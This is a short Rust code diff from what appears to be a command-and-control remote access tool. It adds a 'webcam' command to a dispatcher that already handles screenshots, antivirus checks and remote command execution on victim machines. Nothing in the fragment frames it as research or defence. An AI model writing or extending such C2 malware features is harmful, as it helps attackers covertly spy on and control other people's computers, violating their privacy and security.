@@ -24,6 +24,9 @@ pub fn dispatch_client(instruct: Vec<&str>, conn: &mut TcpStream, state: &C2Stat
         Some(&"screenshot") => client::system::screenshot(conn, state),
         Some(&"av") => client::system::av(conn),
 
+        // Webcam
+        Some(&"webcam") => client::webcam::run(conn, &instruct, state),
+
         // Shell mode
         Some(&"exec") => client::exec::run(conn, &instruct),
         // Some(&"shell") => client::shell::run(conn, state),
